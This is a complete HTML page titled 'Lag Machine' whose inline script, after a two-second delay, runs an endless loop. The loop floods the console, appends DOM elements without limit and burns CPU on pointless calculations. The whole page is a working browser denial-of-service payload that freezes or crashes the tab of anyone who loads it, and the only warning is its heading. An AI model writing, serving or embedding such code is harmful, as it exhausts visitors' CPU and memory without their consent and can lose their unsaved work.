<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lag Machine</title>
</head>
<body>
    <h1>Prepare for extreme lag!</h1>
    <script>
        setTimeout(() => {
            while (true) {
                // Flood the console
                console.error("Lagging the browser");
                
                // Create infinite DOM elements
                let div = document.createElement("div");
                div.innerText = "Lag!";
                document.body.appendChild(div);

                // Heavy calculations (useless loop)
                for (let i = 0; i < 1e7; i++) {
                    Math.sqrt(Math.random() * i);
                }
            }
        }, 2000); // Delay start by 2s to allow page load
    </script>
</body>
</html>
